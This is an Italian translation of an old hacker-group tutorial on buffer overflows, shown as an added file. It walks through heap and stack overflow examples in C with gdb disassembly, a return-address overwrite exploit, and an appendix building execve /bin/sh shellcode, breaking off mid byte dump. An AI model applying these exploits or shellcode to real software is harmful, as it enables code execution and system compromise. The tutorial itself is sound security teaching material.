@@ -1,0 +1,1133 @@
+  
+		    :::::::::   ::::::::  :::::::::  :::::::::: 
+                    :+:    :+: :+:    :+: :+:    :+: :+:        
+                    +:+    +:+ +:+        +:+    +:+ +:+        
+                    +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                    +#+    +#+        +#+ +#+    +#+ +#+        
+                    #+#    #+# #+#    #+# #+#    #+# #+#        
+                    #########   ########  ###    ### ###  
+                         
+              +--------------------------------------------------+
+              |	Introduzione al Buffer Overflow di Ghost_Rider   |
+              |	          Traduzione italiana di                 |
+              |                  N'eM Sy                         |
+              +--------------------------------------------------+
+             
+
+
+
+Scritto per BSRF
+Homepage: http://blacksun.box.sk
+Translators site : http://napolihak.cjb.net
+
+-----
+Intro
+-----
+
+Ciao, eccomi di nuovo, questa volta vi metterò a conoscenza di cos'e' in effette
+il buffer overflow e con potete scoprire se qualche programma e' vulnerabile
+agli
+exploit di buffer overflow. Questo tutorial a codice sorgente C, quindi se non
+conoscete
+il C potrete avere qualche problema con questo tutorial, inoltre dovete avere
+qualche 
+nozione di ASM (ndt Assembler) e su come usare gdb.
+Ho provato a farlo il piu' semplice possibile, ma questo tutorial lo stesso non
+e'
+uno di quelli dove non impari niente di niente e quando l'hai finito sai tutto.
+Questo
+tutorial ha bisogno di qualche sforzo per essere compreso, hey mi e' costato
+molto
+lavoro scriverlo!
+Una piccola note, come chiunque stia leggendo queste righe a me piace imparare,
+cosi
+alcune settimane fa' mi sono detto "Hey che cacchio, perche' non incomincio a
+leggere
+qualcosa riguardo i buffer overflow, io so come il tutto funziona ma solo
+superficialmente
+", cosi ho semplicemente cominciato ad imparare ed ora cerco di passare le
+conoscenze
+che ho acquisito, a chiunque fosse interessato. Quindi questo non sara' uno di
+quei testi
+dove imparerete tutto, sara' piu' come una prova generale, come dice il titolo
+un' Introduzione
+, (alla fine vi daro' qualche testo interessante). Se avete quanche domanda su
+questo 
+tutorial postatela nel nostro message board, se trovate qualche "bug" in questo
+tutorial
+scrivetemi ed io lo correggero'.
+Buon divertimento.
+
+Exploit?
+--------
+
+ Bene, forse tutti sanno cosa e' un exploit. Ma dovete ancora vedere che quelli
+che 
+entrano nel mondo della sicurezza (informatica) per la prima volta probabilmente
+non hanno la minima idea di cosa sia, per questo ho scritto questa piccola
+sezione.
+  Per quelli che non sanno, un exploit e' un programma, di solito scritto in C,
+che sfrutta alcuni problemi di altri programmi. L'exploit vi permettera' di
+eseguire
+codice arbitrario che vi permettera' di fare qualcosa che non dovreste poter
+fare
+in condizioni normali del sistema.
+  Oggi, la maggior parte degli exploit sono cio' che chiamiamo Buffer Overflow
+Exploits.
+What's that you ask. Aspettate un po', perche' ci arriveremo. Dopo tutto, questo
+e'
+l'oggetto di questo tutorial.
+  Un'altra cosa che dovreste sapere e' che chiunque sa come usarli(come credete
+facciano a deturpare la maggior parte dei siti web?), gli "script kiddies" [1*]
+non
+fanno altro che andare in siti come security focus, packetstorm o fyodor's
+exploit 
+world, scaricarli e farli partire, per poi essere presi. Ma perche' non tutti 
+scrivono exploit? Il problema e' che molti non sanno come sfuttare alcune
+"faglie" 
+nel codice sorgente, o anche se possono non sanno scrivere un exploit. Allora,
+ora 
+che avete un idea di cosa sia un exploit, proseguiamo nella sezione Buffer
+Overflow.
+
+
+Dopo tutto, cos'e' il Buffer Overflow?
+--------------------------------------
+
+  Come ho detto prima, la maggior parte degli exploit sono Exploit di Buffer
+Overflow.
+  Starete ora pensando "Bah.. sto tipo sta sparando cose a destra e a manca, ma
+ancora
+non ha detto cosa e' un buffer overflow". Ora ne parliamo.
+  Un problema da buffer overflow e' situato nella memoria dove il programma
+conserva 
+i suoi dati. Perche', direte voi. Perche' cio' che un buffer overflow fa' e' 
+sovrascrivere specifiche aree delle memoria con cio' che volete, e cio' fara'
+fare al
+programma cio' che volete.
+  Eheh, ora qualcuno di voi stara' pensando "Uao, So come funziona un buffer
+overflow",
+ma ancora non sapete come sfruttarlo.
+
+  Eccovi un programma, cerchiamo di trovare e aggiustare il buffer overflow
+
+
+------ Inizio del codice --------
+
+   main(int argc, char **argv) {
+
+      char *somevar;
+      char *important;
+
+      somevar = (char *)malloc(sizeof(char)*4);
+      important = (char *)malloc(sizeof(char)*14);
+
+      strcpy(important, "command");  /*Questa e' la variabile
+                                              'importante'*/
+      stcrpy(somevar, argv[1]);
+
+
+      ..... Code here ....
+
+  }
+
+ ....  Other functions here ....
+
+------- Fine  ------
+
+
+ La variabile imporant conserva qualche comando di sistema, per esempio "chmod
+o-r file", 
+e dal momento che 'file' appartiene a root e il programma viene eseguito da
+root, questo 
+significa che se potete inviargli dei comandi potrete eseguire qualsiasi comando
+di 
+sistema. Cosi iniziate a pensare. Come posso mettere cio' che voglio nella
+variabile
+'important' . Bisogna mandare la memoria in overflow. Ora vediamo gli indirizzi
+di memoria
+delle variabile. Per fare cio' dovrete riscrivere il codice. Controllate il
+codice seguente.
+
+
+
+--------- Inizio del codice ------------
+
+main (int argc, char **argv) {
+
+
+   char *somevar;
+   char *important;
+
+   somevar=(char *)malloc(sizeof(char)*4);
+   important=(char *)malloc(sizeof(char)*14);
+
+   printf("%p\n%p", somevar, important);
+   exit(0);
+
+   segue altro codice....
+   ......
+   ....
+
+}
+
+--------- Fine  --------
+
+ Non abbiamo fatto altro che aggiungere 2 righe al codice e lasciare intatto il
+resto.
+Vediamo cosa fanno queste due righe.
+  La riga printf("%p\n%p", somevar, important); stampa l'indirizzo di memoria di
+'somevar' e 'important'. exit(0); lascera' che il resto del programma continui,
+in effetti
+il nostro scopo era quello di sapere dove le variabili fossero conservate in
+memoria.
+  Una volta eseguito il programma otterrete qualcosa del genere, anche se molto
+probabilmente
+gli indirizzi saranno differenti:
+
+        0x8049700      <----- Questo e' l'indirizzo di 'somevar'
+        0x8049710       <----- Questo e' l'indirizzo di 'important'
+  
+  Come potete vedere, la variabile 'important' e' situata accanto 'somevar',
+questo ci 
+permettera' di usare le nostre capacita' con il buffer overflow, visto che
+'somevar' 
+viene prese da argv[1]. Ora che sappiamo che una variabile segue l'altra,
+controlliamo
+ogni indirizzo di memoria in modo da avere un'idea piu' precisa della
+conservazione 
+in memoria dei dati. Per fare cio' dovremo riscrivere ancora una volta il
+codice.
+
+
+-------- Inizio del codice ---------
+
+main(int argc, char **argv) {
+
+   char *somevar;
+   char *important;
+   char *temp; 		/* abbiamo bisogno di quest'altra nuova variabile */
+
+
+   somevar=(char *)malloc(sizeof(char)*4);
+   important=(char *)malloc(sizeof(char)*14);
+
+   strcpy(important, "command");  /*Questa e' la variabile
+                                              'importante'*/
+   strcpy(somevar, argv[1]);
+
+
+
+   printf("%p\n%p\n", somevar, important);
+   printf("Starting To Print memory address:\n");
+
+   temp = somevar; 	/* Questo fara puntare temp all'inizio dell'aria di memoria 
+			   di 'somevar' */
+
+      while(temp < important + 14) {
+
+      /* Questo loop sara' interrotto quando avremo raggiunto la fine dell'aria
+di
+	 memoria riservata alle variabili */
+
+         printf("%p: %c (0x%x)\n", temp, *temp, *(unsigned int*)temp);
+         temp++;
+
+      }
+
+     exit(0);
+
+     rest of code here
+}
+------ Fine ------
+
+  Mettiamo per esempio ch e argv[1] in casi normali debba essere send. Digitate
+al 
+prompt:
+
+$ nome_programma send
+
+Otterrete qualcosa del genere: 
+
+0x8049700
+0x8049710
+Starting To Print memory address:
+0x8049700: s (0x616c62)
+0x8049701: e (0x616c)
+0x8049702: n (0x61)    <---- Ognuna di queste righe rappresenta un indirizzo di
+memoria
+0x8049703: d (0x0)
+0x8049704:  (0x0)
+0x8049705:  (0x0)
+0x8049706:  (0x0)
+0x8049707:  (0x0)
+0x8049708:  (0x0)
+0x8049709:  (0x19000000)
+0x804970a:  (0x190000)
+0x804970b:  (0x1900)
+0x804970c:  (0x19)
+0x804970d:  (0x63000000)
+0x804970e:  (0x6f630000)
+0x804970f:  (0x6d6f6300)
+0x8049710: c (0x6d6d6f63)
+0x8049711: o (0x616d6d6f)
+0x8049712: m (0x6e616d6d)
+0x8049713: m (0x646e616d)
+0x8049714: a (0x646e61)
+0x8049715: n (0x646e)
+0x8049716: d (0x64)
+0x8049717:  (0x0)
+0x8049718:  (0x0)
+0x8049719:  (0x0)
+0x804971a:  (0x0)
+0x804971b:  (0x0)
+0x804971c:  (0x0)
+0x804971d:  (0x0)
+$
+
+Bello, vero? Vedete che esistono 12 indirizzi di memoria vuoti tra 'somevar' e 
+'important' ? Ora mettiamo il caso che eseguiate il programma con un linea di
+comando
+tipo questa:
+
+$ nome_programma send------------newcommand
+
+Avrete qualcosa tipo:
+
+0x8049700
+0x8049710
+Starting To Print memory address:
+0x8049700: s (0x646e6573)
+0x8049701: e (0x2d646e65)
+0x8049702: n (0x2d2d646e)
+0x8049703: d (0x2d2d2d64)
+0x8049704: - (0x2d2d2d2d)
+0x8049705: - (0x2d2d2d2d)
+0x8049706: - (0x2d2d2d2d)
+0x8049707: - (0x2d2d2d2d)
+0x8049708: - (0x2d2d2d2d)
+0x8049709: - (0x2d2d2d2d)
+0x804970a: - (0x2d2d2d2d)
+0x804970b: - (0x2d2d2d2d)
+0x804970c: - (0x2d2d2d2d)
+0x804970d: - (0x6e2d2d2d)
+0x804970e: - (0x656e2d2d)
+0x804970f: - (0x77656e2d)
+0x8049710: n (0x6377656e) <--- memory address where important variable starts
+0x8049711: e (0x6f637765)
+0x8049712: w (0x6d6f6377)
+0x8049713: c (0x6d6d6f63)
+0x8049714: o (0x616d6d6f)
+0x8049715: m (0x6e616d6d)
+0x8049716: m (0x646e616d)
+0x8049717: a (0x646e61)
+0x8049718: n (0x646e)
+0x8049719: d (0x64)
+0x804971a:  (0x0)
+0x804971b:  (0x0)
+0x804971c:  (0x0)
+0x804971d:  (0x0)
+
+  newcommand ha sovrascritto command. Ora fa cio' che voi volete, inveci di cio'
+che
+era prestabilito.
+
+NOTA: Ricordate sempre che lo spazio tra 'somevar' e 'important' puo' contenere
+altre
+variabili invece di essere vuoto, percio' controllate il loro valore e fate in
+modo
+che arrivino allo stesso indirizzo, o il programma molto probabilmente si
+blocchera' 
+prima di arrivare alla variabile che avete modificato.
+
+
+  Ora riflettiamo un po'. Perche' cio' accade? Come potete vedere nel sorgente
+'somevar'
+e' dichirato prima di important, e cio' fara' si', la maggior parte delle volte,
+che 
+'somevar' stia prima in memoria. Ora controlliamo come ogni variabile viene
+assegnata.
+'somevar' prende il suo valore da argv[1], e 'important' dalla funzione
+strcpy(), ma
+il vero problema e' che il valore di 'important' viene assegnato per primo
+quindi 
+quando assegnate un valore a 'somevar' che e' posto prima di 'important',
+quest'ultimo
+viene sovrascritto. Il programma puo' essere corretto da questo buffer overflow
+invertendo
+queste due righe:
+
+strcpy(somevar, argv[1]);
+strcpy(important, "command");
+
+  Se il programma fosse stato scritto cosi, anche se voi avreste scritto nella
+linea di 
+comando un argomento che avrebbe sovrascritto l'area di memoria di 'important',
+questa 
+sarebbe stata ri-sovrascritta dal vero comando, visto che dopo l'assegnazione di
+un 
+valore a 'somevar', il programma assegna il valore command a 'important'.
+
+  Questo tipo e' un buffer overflow di memoria (heap). Come avrete sicuramente
+notato in teoria
+sono veramente semplici ma, nel mondo reale, non e' cosi semplice trovarli, dopo
+tutto 
+l'esempio che vi ho data non era un programma stupido? E' davvero difficile
+trovare 
+le variabili 'important', ed anche per fare l'overflow di questa variabile
+dovrete poter
+scrivere in una variabile posto in un'area di memoria inferiore, ma la maggior
+parte delle
+volte queste condizioni non capitano contemporaneamente. Per questo vi
+introdurro' ai
+Buffer overflow dello stack (o delle pile).
+
+
+Una piccola annotazione:
+------------------------
+  Nell'ultimo paragrafo ho parlato di memoria(heap) e stack. Probabilmente vi
+starete chiedendo 
+cosi siano. Per la vostra fame di conoscenza, eccovi una breve e semplice
+definizione
+di ognuno di essi:
+
+memoria (heap) - E' lo spazio che riservate alle variabili (accedete a
+quest'area della
+                 memoria con la funzione malloc() ).
+stack - E' il posto dove vengono spinti o dove vengono ritornati valori da una
+funzione.
+
+  Quando provate a fare un overflow su uno stack dovrete provare a cambiare
+l'indirizzo 
+di ritorno, facendo saltare il codice fino al posto dove dovete inserire i
+comandi che 
+volete siano eseguiti.
+Incominciamo a parlare dello stack. Qui incomincia la parte che mi ha dato, e
+ancora 
+mi da', molti problemi. Dovete conoscere un po' di ASM, come maneggiare gdb
+(credetimi 
+diverra' uno dei vostri migliori amici), e non dovrete arrendervi.
+
+Vediamo ora come "Mandare in frantumi lo stack", un tipo di "attacco" che
+cambia l'indirizzo di ritorno (RET). Facendo cio' potrete far ritornare la
+funzione 
+ad un indirizzo dove sono gia' allocati dei comandi che volete siano eseguiti.
+Come in un overflow della memoria, vediamo un po' di codice sorgente.
+
+
+------ Inizio del codice ------
+
+/* Stack Overflow example */
+
+exploit(char *this) {
+ char string[20];
+ strcpy(string,this);
+ printf("%s\n", string);
+}
+
+main(int argc, char *argv[]) {
+ exploit(argv[1]);
+}
+
+------ Fine -----
+
+Ora proveremo a chiamare duo volte la funzione exploit(). Come possiamo farlo?
+Per prima cosa abbiamo bisogno di trovare degli indirizzi. Questa volta useremo
+gdb. Per prima cosa compiliamo.
+
+$ gcc stack.c -o stack
+$ gdb stack
+
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB e' un programma libero, coperto dalla GNU General Public License, e siete
+liberi di cambiarlo e/o ridistribuirne copie, purche' rispettiate alcune
+condizioni.
+Scrivete "show copying" per vedere le condizioni.
+Non ci sono garanzie per  GDB. Digitate "show warranty" per i dettagli.
+Questo GDB e' stato configurato come "i586-suse-linux-gnu"...
+(gdb)
+
+ Questo e' il vostro prompt, ora disassembleremo main. Per fare cio' digitare
+ disassemble (oppure disas) main , difficile vero'?
+
+(gdb) disas main
+ Dump of assembler code for function main:
+ 0x8048440 <main>:       push   %ebp
+ 0x8048441 <main+1>:     mov    %esp,%ebp
+ 0x8048443 <main+3>:     mov    0xc(%ebp),%eax
+ 0x8048446 <main+6>:     add    $0x4,%eax
+ 0x8048449 <main+9>:     mov    (%eax),%edx
+ 0x804844b <main+11>:    push   %edx
+ 0x804844c <main+12>:    call   0x8048410 <exploit>
+ 0x8048451 <main+17>:    add    $0x4,%esp
+ 0x8048454 <main+20>:    mov    %ebp,%esp
+ 0x8048456 <main+22>:    pop    %ebp
+ 0x8048457 <main+23>:    ret
+  (Seguono alcune NOPS. NOP sta' per No Operation... cio' non viene fatto
+niente).
+  End of assembler dump.
+
+ Riflettiamo un po'
+ ------------------
+Come possiamo vedere exploit() viene chiamato all'indirizzo 0x804845c e questa
+ha
+0x8048410 come suo indirizzo.
+
+ Di nuovo gdb
+ ------------
+
+ (gdb) disas exploit
+
+ End of assembler dump.
+ (gdb)
+  0x8048410 <exploit>:    push   %ebp
+  0x8048411 <exploit+1>:  mov    %esp,%ebp
+  0x8048413 <exploit+3>:  sub    $0x14,%esp
+  0x8048416 <exploit+6>:  mov    0x8(%ebp),%eax
+  0x8048419 <exploit+9>:  push   %eax
+  0x804841a <exploit+10>: lea    0xffffffec(%ebp),%eax
+  0x804841d <exploit+13>: push   %eax
+  0x804841e <exploit+14>: call   0x8048340 <strcpy>
+  0x8048423 <exploit+19>: add    $0x8,%esp
+  0x8048426 <exploit+22>: lea    0xffffffec(%ebp),%eax
+  0x8048429 <exploit+25>: push   %eax
+  0x804842a <exploit+26>: push   $0x80484bc
+  0x804842f <exploit+31>: call   0x8048330 <printf>
+  0x8048434 <exploit+36>: add    $0x8,%esp
+  0x8048437 <exploit+39>: mov    %ebp,%esp
+  0x8048439 <exploit+41>: pop    %ebp
+  0x804843a <exploit+42>: ret
+ (gdb) x/3bc 0x80484bc
+  0x80484bc <_IO_stdin_used+4>:   37 '%'  115 's' 10 '\n'
+ (gdb)
+ (gdb) quit
+ $
+ back to the prompt  
+
+ Riflettiamo ancora un po'
+ -------------------------
+ Vi starete chiedendo cosa sia il comando x/3bc. Beh, questo comando ci permette
+di
+esaminare la memoria.
+
+     x/3bc
+       ^^^
+       |||--- chars
+       || --- Binary
+       |----- define 3 as range
+
+(Per maggiori informazioni digitate al prompt help x/)
+
+Ho fatto cio' perche' mi chiedevo cosa fosse spinto nello stack all'indirizzo
+0x80484cc , e come potete vedere e' la stringa che vogliamo stampare.
+
+ Il nostro fine
+ --------------
+
+  Ora dovremo cercare di far in modo che exploit ritorni il controllo di nuovo
+ad 
+exploit invece che al main. Come facciamo, e come facciamo a sapere se cio' e' 
+possibile? Il primo segnale che abbiamo e' che otteniamo segmentation fault se 
+passiamo una stringa enorme, beh non enorme come aaaaaaaaaaaaaaaaaa, provate con
+20 caratteri.
+  Per fare cio' dobbiamo cambiare il RET (return address) a cui state pensando
+nella riga che avete visto in gdb:
+
+      0x804844c <main+3>:  call  0x8048410 <exploit>
+
+  Ed ora una domanda. In questa riga cosi imporante abbiamo due indirizzi, quale
+dei due dobbiamo utilizzare? Detto fatto. Dovrete usare 0x804844c perche' e 
+quello che compie la chiamata a exploit, se inveci usiamo 0x8048410 non avremmo
+ottenuto niente visto che avremmo puntato a 
+
+     0x8048410 <exploit>:    push   %ebp
+
+
+------ Inizio del codice -----
+
+/* Exploit for stack program */
+
+#include <stdio.h>
+
+main() {
+
+char buf[28];
+int i;
+
+for(i=0; i<24; i+=4) *(long *)&buf[i] = 0x61616161;
+*(long *)&buf[24] = 0x0804844c;
+*(long *)&buf[28] = 0x0;
+execv("./stack2", buf);
+}
+
+------- Fine --------
+
+
+Facendo cio' riscriviamo l'indirizzo di ritorno (RET) di 0x0804844c, facendo 
+si che la funzione richiami dinuovo exploit(). Questo inizierà un loop senza
+fine.
+Perche' potevamo exploitare questo programma? Perche' non c'era un controllo
+sulla
+lunghezza della stringa che stavamo inserendo. Un consiglio nel caso dobbiate 
+codificare qualcosa che deve essere sicuro, usate sempre funzioni che fanno un 
+controllo sulla lunghezza, come fgets(), strncpy(), al posto di gets(),
+strcpy(), e 
+cosi via.
+
+Consigli per gdb
+----------------
+
+  Volete vedere come un exploit 'affligge' il programma vulnerabile? Entrate in
+gdb e
+scrivete:
+(gdb) exec exploit
+(gdb) symbol-file vunerable_program
+
+  Vedrete cosa combina l'exploit, e poi corregete i problemi, se ne doveste
+avere.
+
+
+Ultimi suggerimenti
+-------------------
+
+
+Finalmente abbiamo raggiunto la fine. Spero che cio' si stato di vostra
+utilita'... 
+Ho in mente di aggiornare questo tutorial, visto che non ha tutto cio' che avevo
+intenzione di dire. Ma preferisco controllare tutto cio' che dico, invece di 
+dire qualcosa di cui non ero sicuro al 100%.
+Se trovate qualcosa in questo tutorial che non vi convice, sentitevi liberi di 
+scrivermi.
+
+
+Suggerimenti per la lettura
+---------------------------
+
+
+- Omega Project by Lamagra
+- Advanced buffer overflow exploit by Taeho Oh
+- Smashing The Stack For Fun And Profit by Aleph One
+
+Questi tre testi vi daranno un'impressionante quantita' di informazioni.
+Mi hanno aiutato molto.... Li trovate su packetstorm.securify.com
+
+
+----------------------
+Appendix A: Shell Code
+----------------------
+
+Questa appendice e' stata scritta per un amico, che ringrazio moltissimo per
+i suoi aiuti. Il testo originale e' qui sotto. 
+
+Regards 
+mailto:predator@beotel.yu 
+ICQ#:            46043882 
+
+Ho scritto tutto questo come parte del tutorial di Ghost Rider sui Buffer
+Overflow
+che potete scaricare da http://blacksun.box.sk
+Author:     predator 
+mailto:     preedator@hotmail.com 
+date  :     26/07/2000
+
+				Shell code
+
+Ora parleremo dello shell code. Lo shell code e' un array dei caratteri che 
+consiste in istruzioni macchina che vengono usate per creare shell. Visto 
+che il programma che cercheremo di exploitare non ha un codice che esegue una
+shell, dovremmo scriverlo noi. Percio', bisogna conoscere un po' di assembly, C
+ e di architettura x86. E' preferibile avere una conoscenza, seppur minima di 
+Linux. Comunque solo il C e l'assembly sono veramente necessari. Incominciamo.
+
+1. Shell code 
+-------------
+
+Di solito il codice per la shell e' scritto nei programmi come ->
+ 1) char c0de[]={0x90,0x90...}; 
+ 2) char c0de[]="\x90\x90..."; 
+Entrambi i modi sono corretti, percio' potete usare quello che preferite.:)).
+
+
+2.Iniziamo con lo shell code
+----------------------------
+
+
+------- shell.cpp ---------- 
+void main(){ 
+ char *sh[2]; 
+ sh[0]="/bin/sh"; 
+ sh[1]=NULL; 
+ execve(sh[0],sh,NULL); 
+} 
+------- Fine ----------
+
+Questo programma e' utilizzato per avviare una shell. Perche' utilizziamo execve
+se ci sono un casino di funzioni exec (funzioni che eseguono programmi). La 
+risposta e' semplice, execve e' l'unica funzione che e' chiamata con l'interrupt
+$0x80, che per noi e' molto importante.
+
+Compiliamo tutto cio' con l'opzione -static e eseguiamolo con gdb.
+
+>root@scorpion#cc shell.cpp -o shell -static 
+>root@scorpion#gdb shell 
+>GNU gdb 4.18 
+>Copyright 1998 Free Software Foundation, Inc. 
+>GDB is free software, covered by the GNU General Public License, and you are 
+>welcome to change it and/or distribute copies of it under certain conditions. 
+>Type "show copying" to see the conditions. 
+>There is absolutely no warranty for GDB.  Type "show warranty" for details. 
+>This GDB was configured as "i686-pc-linux-gnu"... 
+>(gdb) disass main 
+>Dump of assembler code for function main: 
+>0x80481c0 <main>:       push   %ebp 
+>0x80481c1 <main+1>:     mov    %esp,%ebp 
+>0x80481c3 <main+3>:     sub    $0x8,%esp 
+>0x80481c6 <main+6>:     movl   $0x8073768,0xfffffff8(%ebp) 
+>0x80481cd <main+13>:    movl   $0x0,0xfffffffc(%ebp) 
+>0x80481d4 <main+20>:    push   $0x0 
+>0x80481d6 <main+22>:    lea    0xfffffff8(%ebp),%eax 
+>0x80481d9 <main+25>:    push   %eax 
+>0x80481da <main+26>:    mov    0xfffffff8(%ebp),%eax 
+>0x80481dd <main+29>:    push   %eax 
+>0x80481de <main+30>:    call   0x804ea70 <__execve> 
+>0x80481e3 <main+35>:    add    $0xc,%esp 
+>0x80481e6 <main+38>:    xor    %eax,%eax 
+>0x80481e8 <main+40>:    jmp    0x80481f0 <main+48> 
+>0x80481ea <main+42>:    lea    0x0(%esi),%esi 
+>0x80481f0 <main+48>:    mov    %ebp,%esp 
+>0x80481f2 <main+50>:    pop    %ebp 
+>0x80481f3 <main+51>:    ret 
+>0x80481f4 <main+52>:    nop 
+>0x80481f5 <main+53>:    nop 
+>0x80481f6 <main+54>:    nop 
+>0x80481f7 <main+55>:    nop 
+>0x80481f8 <main+56>:    nop 
+>0x80481f9 <main+57>:    nop 
+>0x80481fa <main+58>:    nop 
+>0x80481fb <main+59>:    nop 
+>0x80481fc <main+60>:    nop 
+>0x80481fd <main+61>:    nop 
+>0x80481fe <main+62>:    nop 
+>0x80481ff <main+63>:    nop 
+>End of assembler dump. 
+>(gdb) disass execve 
+>Dump of assembler code for function __execve: 
+>0x804ea70 <__execve>:   push   %ebx 
+>0x804ea71 <__execve+1>: mov    0x10(%esp,1),%edx 
+>0x804ea75 <__execve+5>: mov    0xc(%esp,1),%ecx 
+>0x804ea79 <__execve+9>: mov    0x8(%esp,1),%ebx 
+>0x804ea7d <__execve+13>:        mov    $0xb,%eax 
+>0x804ea82 <__execve+18>:        int    $0x80 
+>0x804ea84 <__execve+20>:        pop    %ebx 
+>0x804ea85 <__execve+21>:        cmp    $0xfffff001,%eax 
+>0x804ea8a <__execve+26>:        jae    0x804ee40 <__syscall_error> 
+>0x804ea90 <__execve+32>:        ret 
+>End of assembler dump. 
+>(gdb) quit 
+
+Ora guardiamo un po' il main:) Tutte le funzioni partono da li'.
+
+main -> push %ebp 
+main+1 ->movl %esp,%ebp 
+Questa e' la procedura standard in tutte le funzioni. Per prima cosa salviamo 
+%ebp e poi muoviamo %esp su %ebp facendo di %ebp il nuovo puntatore al frame.
+
+main+3 -> sub $0x8,%esp 
+sub %esp con 0x8 perche' due puntatori a caratteri sono lunghi 8 byte, 2*4=8:)) 
+
+main+6 -> movl 0x8073768,0xfffffff8(%ebp) 
+uguale a sh[0]="/bin/sh"; 
+ 
+main+13 -> movl $0x0,0xfffffffc(%ebp) 
+same as sh[1]=NULL; 
+
+main+20 -> pushl $0x0  
+La chiamata a excve parte quim stiamo spingendo gli argomenti della funzione in 
+ordine inverso sullo stack(l'architettura x86 funziona sotto-sopra).
+
+main+22 -> lea 0xfffffff8(%ebp),%eax 
+lea sta per "load effective address", carichiamo l'indirizzo di sh nell'array di
+puntatori
+
+
+main+25 -> pushl %eax  
+spingiamo l'indirizzo sullo stack (secondo argomento (sh) ).
+
+main+26 -> movl 0xfffffff8(%ebp),%eax ...
+in 0xfffffff8(%ebp) abbiamo l'indirizzo di /bin/sh. guardiamo main+6 e poi 
+spingiamolo sullo stack come sh[0]
+
+Ora diamo uno sguardo nella funzione execve
+
+__execve+1 mov 0x10(%esp,1),%edx
+Dobbiamo avere l'indirizzo del terzo argomento in %edx(il terzo argomento era 
+essere NULL)
+
+__execve+5 mov 0xc(%esp,1),%ecx 
+Dobbiamo avere l'indirizzo di sh in %ecx(sh era il secondo argomento)
+
+__execve+9 mov 0x8(%esp,1),%ebx 
+Dobbiamo avere l'indirizzo di "/bin/sh" in %ebx(sh[0] era il primo argomento)
+
+
+__execve+13 mov $0xb,%eax 
+0xb e' la chiamata di sistema per execve
+
+
+__execve+18 int $0x80 
+Passiamo al kernel mode
+
+Cose da fare->
+Dobbiamo avere l'indirizzo di NULL in %edx
+Dobbiamo avere l'indirizzo di sh in %ecx
+Dobbiamo avere l'indirizzo di "/bin/sh" in %ebx
+Dobbiamo avere 0xb in %eax
+Dobbiamo chiamare l'interrupt $0x80
+
+Abbiamo bisogno dell'esatto indirizzo in memoria della nostra stringa "/bin/sh".
+Possiamo semplicemente mettere "/bin/sh" dopo la chiamata che spingera' EIP 
+sullo stack, e l'EIP, una volta spinto, dovrebbe essere l'indirizzo della 
+nostra stringa... Guardate pic 0.1
+
+[JJaaaaaaaaaaaaaaaaaaaaaaaaCCssssss] 
+  |^_______________________^| 
+   |________________________| 
+All'inizio del codice metteremo l'istruzione JMP che saltera' alla chiamata, 
+che salvera' EIP e poi andra' all'offset di a.EIP sara' il nostro indirizzo di 
+"/bin/sh"
+a-stands for code 
+J-stands for JMP 
+C-stands for CALL 
+s-stands for "/bin/sh" 
+
+Bene, ora scriviamo questo in asm->
+
+
+------------ shell1.cpp ---------------- 
+void main(){ 
+__asm__("jmp 0x1e \n"      //jmp alla chiamata 
+ "popl %esi \n"   	   //salva EIP in esi,ora abbiamo l'indirizzo di /bin/sh 
+ "movl %esi,0x8(%esi) \n"  //indirizzo di sh dietro /bin/sh 
+ "movl $0x0,0xc(%esi) \n"  //NULL come terzo argomento va dopo l'indirizzo di sh
+ "movb $0x0,0x7(%esi) \n"  //termina /bin/sh con '\0' 
+ "movl %esi,%ebx \n"       //indirizzo di  sh[0] in %ebx 
+ "leal %0x8(%esi),%ecx \n" //indirizzo di sh in %ecx(secondo argomento) 
+ "leal %0xc(%esi),%edx \n" //indirizzo di NULL in %edx(terzo argomento) 
+ "movl $0xb,%eax \n"       //chiamata di sistema a execve in %eax 
+ " int $0x80 \n"           //kernel mode 
+ " call -0x23 \n"          //chiama popl su %esi 
+ " .string \"/bin/sh\" \n"); //la nostra stringa
+} 
+------------ Fine ---------------- 
+
+
+Compiliamo il tutto
+
+root@scorpion#cc shel1.cpp -o shell1 
+root@scorpion#gdb shell1 
+GNU gdb 4.18 
+Copyright 1998 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type "show copying" to see the conditions. 
+There is absolutely no warranty for GDB.  Type "show warranty" for details. 
+This GDB was configured as "i686-pc-linux-gnu"... 
+(gdb) x/bx main+3       <-------jmp start here 
+0x8048733 <main+3>:     0xeb 
+(gdb) 
+0x8048734 <main+4>:     0x1e 
+(gdb) 
+0x8048735 <main+5>:     0x5e 
+(gdb) 
+0x8048736 <main+6>:     0x89 
+(gdb) 
+0x8048737 <main+7>:     0x76 
+(gdb) 
+0x8048738 <main+8>:     0x08 
+(gdb) 
+0x8048739 <main+9>:     0xc6 
+(gdb) 
+0x804873a <main+10>:    0x46 
+(gdb) 
+0x804873b <main+11>:    0x07 
+(gdb) 
+0x804873c <main+12>:    0x00 
+(gdb) 
+0x804873d <main+13>:    0xc7 
+(gdb) 
+0x804873e <main+14>:    0x46 
+(gdb) 
+0x804873f <main+15>:    0x0c 
+(gdb) 
+0x8048740 <main+16>:    0x00 
+(gdb) 
+0x8048741 <main+17>:    0x00 
+(gdb) 
+0x8048742 <main+18>:    0x00 
+(gdb) 
+0x8048743 <main+19>:    0x00 
+(gdb) 
+0x8048744 <main+20>:    0x89 
+(gdb) 
+0x8048745 <main+21>:    0xf3 
+(gdb) 
+0x8048746 <main+22>:    0x8d 
+(gdb) 
+0x8048747 <main+23>:    0x4e 
+(gdb) 
+0x8048748 <main+24>:    0x08 
+(gdb) 
+0x8048749 <main+25>:    0x8d 
+(gdb) 
+0x804874a <main+26>:    0x56 
+(gdb) 
+0x804874b <main+27>:    0x0c 
+(gdb) 
+0x804874c <main+28>:    0xb8 
+(gdb) 
+0x804874d <main+29>:    0x0b 
+(gdb) 
+0x804874e <main+30>:    0x00 
+(gdb) 
+0x804874f <main+31>:    0x00 
+(gdb) 
+0x8048750 <main+32>:    0x00 
+(gdb) 
+0x8048751 <main+33>:    0xcd 
+(gdb) 
+0x8048752 <main+34>:    0x80 
+(gdb) 
+0x8048753 <main+35>:    0xe8 
+(gdb) 
+0x8048754 <main+36>:    0xdd 
+(gdb) 
+0x8048755 <main+37>:    0xff 
+(gdb) 
+0x8048756 <main+38>:    0xff 
+(gdb) 
+0x8048757 <main+39>:    0xff 
+(gdb) 
+0x8048758 <main+40>:    0x2f 
+(gdb) 
+0x8048759 <main+41>:    0x62 
+(gdb) 
+0x804875a <main+42>:    0x69 
